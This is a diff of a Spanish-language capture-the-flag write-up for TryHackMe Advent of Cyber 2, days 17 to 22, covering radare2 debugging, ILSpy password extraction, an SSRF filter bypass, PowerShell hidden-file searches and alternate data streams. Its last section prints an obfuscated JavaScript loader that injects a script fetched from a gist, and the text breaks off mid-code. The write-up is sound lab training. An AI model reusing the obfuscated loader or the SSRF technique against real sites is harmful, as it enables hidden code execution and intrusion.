 <p>Se inicia <code>radare2</code> con el archivo <code>challenge1</code>, se indica que se realizará un analisis con el &ldquo;comando&rdquo; <code>aa</code>. Con el &ldquo;comando&rdquo;  <code>afl</code> listamos todas las <strong>funciones</strong> presentes en el archivo y junto con <code>| grep main</code> &ldquo;filtramos&rdquo; los valores de la funcion principal <strong>main</strong>. Con el nombre de la funcion se realiza un desensamblado de la funcion con el &ldquo;comando&rdquo; <code>pdf @sym.main</code> o <code>pdf @main</code>, lo que mostrará el codigo en ensamblador para su analisis.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -3833,7 +3830,7 @@ https://github.com/BulmaTemplates/bulma-templates
 </span><span class="lnt">42
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">elfmceager@tbfc-day-17:~$ r2 -d ./challenge1
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">elfmceager@tbfc-day-17:~$ r2 -d ./challenge1
 Process with PID <span class="m">1506</span> started...
 <span class="o">=</span> attach <span class="m">1506</span> <span class="m">1506</span>
 bin.baddr 0x00400000
@@ -3880,12 +3877,12 @@ asm.bits <span class="m">64</span>
 </div><p>Para resolver la primera pregunta debemos de ubicarnos donde se encuentra la instruccion <code>mov</code>, donde agregámos un <em>breakpoint</em> para que cuando ejecutemos el programa, este haga una pausa y poder analisar el valor de <code>local_ch</code>. Tambien necesitamos la direccion en memoria de <code>local_ch</code> (las primeras lineas de la funcion <code>main</code>) que tiene como valor <code>rbp-0xc</code>. En el siguiente codigo se muestran ambas lineas.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="p">;</span> var int local_ch @ rbp-0xc
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="p">;</span> var int local_ch @ rbp-0xc
 <span class="o">[</span>... snip ...<span class="o">]</span>
 <span class="p">|</span>           0x00400b51      c745f4010000.  mov dword <span class="o">[</span>local_ch<span class="o">]</span>, <span class="m">1</span>
 </code></pre></td></tr></table>
@@ -3897,16 +3894,16 @@ asm.bits <span class="m">64</span>
 <p>Para la segunda pregunta creamos un <em>breakpoint</em> en la direccion de memoria de la instruccion <code>imul</code> (<code>db 0x00400b62</code>).</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="p">|</span>           0x00400b62      0faf45f8       imul eax, dword <span class="o">[</span>local_8h<span class="o">]</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="p">|</span>           0x00400b62      0faf45f8       imul eax, dword <span class="o">[</span>local_8h<span class="o">]</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>Nuevamente vemos el <em>breakpoint</em>, realizamos un &ldquo;paso siguiente&rdquo; (<code>ds</code>) y la lectura del valor de <code>eax</code> con el &ldquo;comando&rdquo; <code>dr</code> (valor de <code>rax</code>).</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -3938,7 +3935,7 @@ asm.bits <span class="m">64</span>
 </span><span class="lnt">30
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>0x00400a30<span class="o">]</span>&gt; db 0x00400b62
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>0x00400a30<span class="o">]</span>&gt; db 0x00400b62
 <span class="o">[</span>0x00400a30<span class="o">]</span>&gt; dc
 hit breakpoint at: 400b62
 <span class="o">[</span>0x00400b62<span class="o">]</span>&gt; pdf @main
@@ -3973,16 +3970,16 @@ hit breakpoint at: 400b62
 </div><p>Para resolver la ultima pregunta debemos de crear un <em>breakpoint</em> en:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="p">|</span>           0x00400b69      b800000000     mov eax, <span class="m">0</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="p">|</span>           0x00400b69      b800000000     mov eax, <span class="m">0</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>Y obtener el valor de <code>local_4h</code> (<code>rbp-0x4</code>).</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -4043,7 +4040,7 @@ hit breakpoint at: 400b62
 </span><span class="lnt">59
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>0x00400a30<span class="o">]</span>&gt; pdf @main
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>0x00400a30<span class="o">]</span>&gt; pdf @main
             <span class="p">;</span>-- main:
 / <span class="o">(</span>fcn<span class="o">)</span> sym.main <span class="m">35</span>
 <span class="p">|</span>   sym.main <span class="o">()</span><span class="p">;</span>
@@ -4104,7 +4101,7 @@ hit breakpoint at: 400b69
 <span class="o">[</span>0x00400b69<span class="o">]</span>&gt;
 </code></pre></td></tr></table>
 </div>
-</div><h1 id="day-18---reverse-engineering-">DAY 18 - Reverse Engineering</h1>
+</div><h1 id="day-18---reverse-engineering">DAY 18 - Reverse Engineering</h1>
 <p>Continuando con Ingenieria Inversa, esta vez con un archivo escrito en .NET, para su analisis utilizamos la herramienta que provee THM: <a href="https://github.com/icsharpcode/ILSpy"><strong>ILSpy</strong></a>, en la maquina ofrecida en el reto del dia.</p>
 <p>Al ejecutar el archivo pregunta por una contraseña, y al ingresar un string cualquiera nos muestra un mensaje.<br />
 <img src="/images/posts/thm/aoc2/Screenshotfrom2020-12-1821.06.00.png" alt="image" /><br />
@@ -4116,24 +4113,24 @@ hit breakpoint at: 400b69
 <p>La informacion esta en <code>hexadecimal</code> por lo que al <a href="https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&amp;input=NzMgNjEgNkUgNzQgNjEgNzAgNjEgNzMgNzMgNzcgNkYgNzIgNjQgMzMgMzIgMzEgMDA"><strong>decodificarlo</strong></a> vemos la contraseña. El valor final <code>00</code> se omite ya que hace referencia al final del <em>&ldquo;string&rdquo;</em>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="m">73</span> <span class="m">61</span> 6E <span class="m">74</span> <span class="m">61</span> <span class="m">70</span> <span class="m">61</span> <span class="m">73</span> <span class="m">73</span> <span class="m">77</span> 6F <span class="m">72</span> <span class="m">64</span> <span class="m">33</span> <span class="m">32</span> <span class="m">31</span> 
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="m">73</span> <span class="m">61</span> 6E <span class="m">74</span> <span class="m">61</span> <span class="m">70</span> <span class="m">61</span> <span class="m">73</span> <span class="m">73</span> <span class="m">77</span> 6F <span class="m">72</span> <span class="m">64</span> <span class="m">33</span> <span class="m">32</span> <span class="m">31</span> 
 santapassword321
 </code></pre></td></tr></table>
 </div>
 </div><p>Ingresamos la contraseña encontrada y vemos un mensaje junto con nuestra flag.<br />
 <img src="/images/posts/thm/aoc2/Screenshotfrom2020-12-1821.33.48.png" alt="image" /></p>
-<h1 id="day-19---the-naughty-or-nice-list-">DAY 19 - The Naughty or Nice List</h1>
+<h1 id="day-19---the-naughty-or-nice-list">DAY 19 - The Naughty or Nice List</h1>
 <p>La descripcion del reto del dia indica que la aplicacion web es vulnerable a <strong>Server-Side Request Forgery</strong> (SSRF) y que al hacer <em>bypass</em> al filtro de hostname debemos utilizar <strong>localtest.me</strong> para que funcione. Al visitar la aplicacion vemos una caja de busqueda y tambien un formulario para ingresar credenciales.<br />
 <img src="/images/posts/thm/aoc2/Screenshotfrom2020-12-1913.30.24.png" alt="image" /><br />
 <img src="/images/posts/thm/aoc2/Screenshotfrom2020-12-1913.32.17.png" alt="image" /></p>
 <p>Al revisar el codigo fuente vemos que la caja de busqueda realiza la ejecucion de la funcion <code>checkList()</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -4152,7 +4149,7 @@ santapassword321
 </span><span class="lnt">17
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;col-lg-6 col-md-6 col-sm-12&#34;</span><span class="p">&gt;</span>
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;col-lg-6 col-md-6 col-sm-12&#34;</span><span class="p">&gt;</span>
    Welcome children!<span class="p">&lt;</span><span class="nt">br</span> <span class="p">/&gt;&lt;</span><span class="nt">br</span> <span class="p">/&gt;</span>
    To find out if you are currently on the naughty list or the nice list, please enter your name below!<span class="p">&lt;</span><span class="nt">br</span> <span class="p">/&gt;&lt;</span><span class="nt">br</span> <span class="p">/&gt;</span>
    Have a Merry Christmas! Ho ho ho!<span class="p">&lt;</span><span class="nt">br</span> <span class="p">/&gt;&lt;</span><span class="nt">br</span> <span class="p">/&gt;</span>
@@ -4174,11 +4171,11 @@ santapassword321
 </div><p>La funcion realiza la codificacion de la direccion <code>http://list.hohoho:8080/search.php?name=</code> a URI junto con la codificacion (URI) del valor ingresado en la cajita que tiene como <code>id</code> el valor <code>name</code>, al finalizar esta codificacion creada se pasa como valor del parametro <code>proxy</code> en la pagina principal, de tal forma que quedaria de la siguiente forma si el valor a buscar fuera <code>santa.com</code>:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="s2">&#34;/?proxy=&#34;</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="s2">&#34;http://list.hohoho:8080/search.php?name=&#34;</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;name&#34;</span><span class="p">).</span><span class="nx">value</span><span class="p">)));</span>
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="s2">&#34;/?proxy=&#34;</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="s2">&#34;http://list.hohoho:8080/search.php?name=&#34;</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;name&#34;</span><span class="p">).</span><span class="nx">value</span><span class="p">)));</span>
 <span class="c1">// /?proxy=http%3A%2F%2Flist.hohoho%3A8080%2Fsearch.php%3Fname%3Dsanta.com
 </span></code></pre></td></tr></table>
 </div>
@@ -4193,11 +4190,11 @@ santapassword321
 <ul>
 <li><a href="https://portswigger.net/web-security/ssrf"><strong>SSRF - POSTWIGGER</strong></a></li>
 </ul>
-<h1 id="day-20----powershellf-to-the-rescue-">DAY 20 -  PowershELlF to the rescue</h1>
+<h1 id="day-20----powershellf-to-the-rescue">DAY 20 -  PowershELlF to the rescue</h1>
 <p>El reto del dia incluye utilizar PowerShell y encontrar archivos y strings dentro de estos, la informacion en la descripcion del reto es suficiente para resolver las tareas. Para la primera tarea nos ubicamos en la direccion de <code>Documents</code> y realizamos la busqueda de un archivo oculto.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -4215,7 +4212,7 @@ santapassword321
 </span><span class="lnt">16
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">PS C:<span class="se">\U</span>sers<span class="se">\m</span>ceager&gt; Set-Location Documents<span class="se">\ </span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">PS C:<span class="se">\U</span>sers<span class="se">\m</span>ceager&gt; Set-Location Documents<span class="se">\ </span>
 PS C:<span class="se">\U</span>sers<span class="se">\m</span>ceager<span class="se">\D</span>ocuments&gt; Get-ChildItem -File -Hidden -ErrorAction SilentlyContinue 
 
 
@@ -4236,7 +4233,7 @@ PS C:<span class="se">\U</span>sers<span class="se">\m</span>ceager<span class="
 </div><p>Para la segunda tarea, realizamos de manera similar que la primera tarea pero en este caso buscamos un <code>folder</code> o <code>directorio</code> que especificamos con <code>-Directory</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -4264,7 +4261,7 @@ PS C:<span class="se">\U</span>sers<span class="se">\m</span>ceager<span class="
 </span><span class="lnt">26
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">PS C:<span class="se">\U</span>sers<span class="se">\m</span>ceager&gt; Set-Location -Path Desktop<span class="se">\
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">PS C:<span class="se">\U</span>sers<span class="se">\m</span>ceager&gt; Set-Location -Path Desktop<span class="se">\
 </span><span class="se"></span>PS C:<span class="se">\U</span>sers<span class="se">\m</span>ceager<span class="se">\D</span>esktop&gt; Get-ChildItem -Directory -Hidden -ErrorAction SilentlyContinue
 
 
@@ -4295,7 +4292,7 @@ PS C:<span class="se">\U</span>sers<span class="se">\m</span>ceager<span class="
 </div><p>Para la tercera tarea nos pide que realicemos la busqueda de un directorio oculto en <code>C:\Windows</code>, como sabemos este directorio contiene un centenar de archivos por lo que al realizar la busqueda de la misma manera que en la segunda tarea nos retornaria una gran cantidad de directorios, si nos fijamos en los archivos y directorios que encontramos contienen un numero representado por el numero de tarea en este caso seria el numero <em>3</em> el cual utilizamos para filtrar los archivos que solo contengan este numero.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -4307,7 +4304,7 @@ PS C:<span class="se">\U</span>sers<span class="se">\m</span>ceager<span class="
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">PS C:<span class="se">\W</span>indows&gt; Get-ChildItem -Directory -Recurse -Filter <span class="s1">&#39;*3*&#39;</span> -Hidden -ErrorAction SilentlyContinue
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">PS C:<span class="se">\W</span>indows&gt; Get-ChildItem -Directory -Recurse -Filter <span class="s1">&#39;*3*&#39;</span> -Hidden -ErrorAction SilentlyContinue
 
 
     Directory: C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32
@@ -4322,7 +4319,7 @@ d--h--       11/23/2020   3:26 PM                3lfthr3e
 </div><p>En el directorio que encontramos obtenemos la lista de archivos ocultos y el numero de &ldquo;palabras&rdquo; que contiene el primero.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -4345,7 +4342,7 @@ d--h--       11/23/2020   3:26 PM                3lfthr3e
 </span><span class="lnt">21
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">PS C:<span class="se">\W</span>indows&gt; Set-Location System32<span class="se">\3</span>lfthr3e
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">PS C:<span class="se">\W</span>indows&gt; Set-Location System32<span class="se">\3</span>lfthr3e
 PS C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\3</span>lfthr3e&gt; Get-ChildItem -File -Hidden -ErrorAction SilentlyContinue
 
 
@@ -4371,14 +4368,14 @@ PS C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span clas
 </div><p>Obtenemos las palabras segun el <code>index</code> indicado (551 y 6991):</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">PS C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\3</span>lfthr3e&gt; <span class="o">(</span>Get-Content -Path 1.txt<span class="o">)[</span>551<span class="o">]</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">PS C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\3</span>lfthr3e&gt; <span class="o">(</span>Get-Content -Path 1.txt<span class="o">)[</span>551<span class="o">]</span>
 Red
 PS C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\3</span>lfthr3e&gt; <span class="o">(</span>Get-Content -Path 1.txt<span class="o">)[</span>6991<span class="o">]</span>
 Ryder 
@@ -4388,7 +4385,7 @@ PS C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span clas
 </div><p>En la ultima tarea debemos de buscar las dos palabras anteriores (Red Ryder) dentro del archivo <code>2.txt</code> para ello utilizamos <code>Select-String</code> con <code>-Pattern</code> y con la ayuda de la pista dada.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -4397,7 +4394,7 @@ PS C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span clas
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">PS C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\3</span>lfthr3e&gt; Get-Content -Path 2.txt <span class="p">|</span> Select-String -pattern <span class="s2">&#34;Red Ryder&#34;</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">PS C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\3</span>lfthr3e&gt; Get-Content -Path 2.txt <span class="p">|</span> Select-String -pattern <span class="s2">&#34;Red Ryder&#34;</span>
 PS C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\3</span>lfthr3e&gt; Get-Content -Path 2.txt <span class="p">|</span> Select-String -Pattern <span class="s2">&#34;redryder&#34;</span>
 
 redryderbbgun 
@@ -4406,14 +4403,14 @@ redryderbbgun
 PS C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\3</span>lfthr3e&gt;
 </code></pre></td></tr></table>
 </div>
-</div><h1 id="day-21---time-for-some-elforensics-">DAY 21 - Time for some ELForensics</h1>
+</div><h1 id="day-21---time-for-some-elforensics">DAY 21 - Time for some ELForensics</h1>
 <p>En el reto del dia se presentan algunos ejecutables los cuales pueden ayudar a obtener informacion e identificar archivos, el objetivo es poder encontrar el conector de la base de datos oculto utilizando tecnicas forenses-investigativas.</p>
 <ul>
 <li>1: Debemos de obtener el hash MD5 del archivo <code>db.exe</code> en el archivo de texto en <code>Documents\</code>.</li>
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -4431,7 +4428,7 @@ PS C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span clas
 </span><span class="lnt">16
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">PS C:<span class="se">\U</span>sers<span class="se">\l</span>ittlehelper<span class="se">\D</span>ocuments&gt; dir
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">PS C:<span class="se">\U</span>sers<span class="se">\l</span>ittlehelper<span class="se">\D</span>ocuments&gt; dir
 
 
     Directory: C:<span class="se">\U</span>sers<span class="se">\l</span>ittlehelper<span class="se">\D</span>ocuments
@@ -4455,7 +4452,7 @@ What is the file hash of the mysterious executable within the Documents folder?<
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -4465,7 +4462,7 @@ What is the file hash of the mysterious executable within the Documents folder?<
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">PS C:<span class="se">\U</span>sers<span class="se">\l</span>ittlehelper<span class="se">\D</span>ocuments&gt; Get-FileHash -Algorithm MD5 deebee.exe
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">PS C:<span class="se">\U</span>sers<span class="se">\l</span>ittlehelper<span class="se">\D</span>ocuments&gt; Get-FileHash -Algorithm MD5 deebee.exe
 
 Algorithm       Hash                                                                   Path
 ---------       ----                                                                   ----
@@ -4480,7 +4477,7 @@ PS C:<span class="se">\U</span>sers<span class="se">\l</span>ittlehelper<span cl
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -4488,7 +4485,7 @@ PS C:<span class="se">\U</span>sers<span class="se">\l</span>ittlehelper<span cl
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">PS C:<span class="se">\U</span>sers<span class="se">\l</span>ittlehelper<span class="se">\D</span>ocuments&gt; c:<span class="se">\T</span>ools<span class="se">\s</span>trings64.exe -accepteula deebee.exe <span class="p">|</span> Select-String -pattern <span class="s2">&#34;{&#34;</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">PS C:<span class="se">\U</span>sers<span class="se">\l</span>ittlehelper<span class="se">\D</span>ocuments&gt; c:<span class="se">\T</span>ools<span class="se">\s</span>trings64.exe -accepteula deebee.exe <span class="p">|</span> Select-String -pattern <span class="s2">&#34;{&#34;</span>
 
 THM<span class="o">{</span>f6187e6cb<span class="o">[</span>... snip ...<span class="o">]</span>3e108cb6f9<span class="o">}</span>
 
@@ -4501,7 +4498,7 @@ PS C:<span class="se">\U</span>sers<span class="se">\l</span>ittlehelper<span cl
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -4529,7 +4526,7 @@ PS C:<span class="se">\U</span>sers<span class="se">\l</span>ittlehelper<span cl
 </span><span class="lnt">26
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">PS C:<span class="se">\U</span>sers<span class="se">\l</span>ittlehelper<span class="se">\D</span>ocuments&gt; Get-Item -Path deebee.exe -Stream *
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">PS C:<span class="se">\U</span>sers<span class="se">\l</span>ittlehelper<span class="se">\D</span>ocuments&gt; Get-Item -Path deebee.exe -Stream *
 
 
 PSPath        : Microsoft.PowerShell.Core<span class="se">\F</span>ileSystem::C:<span class="se">\U</span>sers<span class="se">\l</span>ittlehelper<span class="se">\D</span>ocuments<span class="se">\d</span>eebee.exe::<span class="nv">$DATA</span>
@@ -4559,7 +4556,7 @@ PS C:<span class="se">\U</span>sers<span class="se">\l</span>ittlehelper<span cl
 </div>
 </div><p>Ejecutamos el archivo (stream) oculto y nos muestra la flag que necesitabamos.<br />
 <img src="/images/posts/thm/aoc2/Screenshotfrom2020-12-2117.23.14.png" alt="image" /></p>
-<h1 id="day-22---elf-mceager-becomes-cyberelf-">DAY 22 - Elf McEager becomes CyberElf</h1>
+<h1 id="day-22---elf-mceager-becomes-cyberelf">DAY 22 - Elf McEager becomes CyberElf</h1>
 <p>En el reto del dia presentan una serie de retos que consiste en decodificar cadenas de texto utilizando la herramienta CyberChef.</p>
 <ul>
 <li>
@@ -4591,7 +4588,7 @@ PS C:<span class="se">\U</span>sers<span class="se">\l</span>ittlehelper<span cl
 <em>La pista tambien nos indica que agreguemos dos veces <code>From Charcode</code> y nos devuelve: <code>............https://gist.github.com/heavenraiza/....................1d321244c4d667446dbfd9a3298a88b8...........</code></em></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -4611,9 +4608,9 @@ PS C:<span class="se">\U</span>sers<span class="se">\l</span>ittlehelper<span cl
 </span><span class="lnt">18
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kd">var</span> <span class="nx">somestring</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;script&#39;</span><span class="p">);</span>
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kd">var</span> <span class="nx">somestring</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;script&#39;</span><span class="p">);</span>
 <span class="nx">somestring</span><span class="p">.</span><span class="nx">type</span> <span class="o">=</span> <span class="s1">&#39;text/javascript&#39;</span><span class="p">;</span>
-<span class="nx">somestring</span><span class="p">.</span><span class="nx">async</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+<span class="nx">somestring</span><span class="p">.</span><span class="kr">async</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
 <span class="nx">somestring</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="mi">104</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">112</span><span class="p">,</span> <span class="mi">115</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">103</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">115</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">46</span><span class="p">,</span> <span class="mi">103</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">117</span><span class="p">,</span> <span class="mi">98</span><span class="p">,</span> <span class="mi">46</span><span class="p">,</span> <span class="mi">99</span><span class="p">,</span> <span class="mi">111</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span 